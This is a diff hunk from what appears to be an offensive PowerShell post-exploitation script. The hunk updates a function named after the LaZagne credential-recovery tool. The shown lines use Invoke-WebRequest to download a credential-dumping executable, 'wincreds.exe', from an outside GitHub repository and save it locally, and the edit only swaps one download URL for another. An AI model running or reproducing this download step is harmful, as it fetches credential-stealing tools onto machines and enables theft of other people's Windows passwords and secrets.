@@ -4352,7 +4352,7 @@ function laZagnemodule
 
     if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/neon-info-sec/data/refs/heads/main/S3cur3Th1sSh1t")
 	{
-		Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/neon-info-sec/data/refs/heads/main/S3cur3Th1sSh1t/Creds/blob/master/exeFiles/wincreds.exe?raw=true' -Outfile $currentPath\WinCreds.exe
+		Invoke-WebRequest -Uri 'https://github.com/neon-info-sec/data/blob/main/S3cur3Th1sSh1t/Creds/master/exeFiles/wincreds.exe?raw=true' -Outfile $currentPath\WinCreds.exe
 	}
 	else
 	{
